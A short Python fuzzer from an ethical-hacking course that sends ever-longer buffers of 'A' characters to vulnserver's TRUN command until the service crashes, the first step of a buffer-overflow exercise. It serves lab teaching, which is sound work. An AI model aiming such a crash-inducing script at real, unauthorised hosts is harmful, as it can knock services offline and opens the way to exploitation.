#!/usr/bin/python
# for https://academy.tcm-sec.com/p/practical-ethical-hacking-the-complete-course
# not an original work
# a basic protocol fuzzer; sends payload of As to TRUN method of vulnserver
# usage: ./pfuzzer.py <IPv4 address> <port #>

import sys, socket
from time import sleep

HOST = sys.argv[1] 
PORT = int(sys.argv[2])

# set initial buffer value to 100 As
buffer = "A" * 100

while True:
    try:

        # set payload to TRUN method of vulnserver
        payload = "TRUN /.:/" + buffer

        # setup IPV4 TCP socket 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST,PORT))

        print("sending payload of %s bytes" % str(len(buffer)))
        s.send((payload.encode()))
        s.close()
        sleep(1)

        buffer = buffer + "A"*100

    except:
        print ("fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
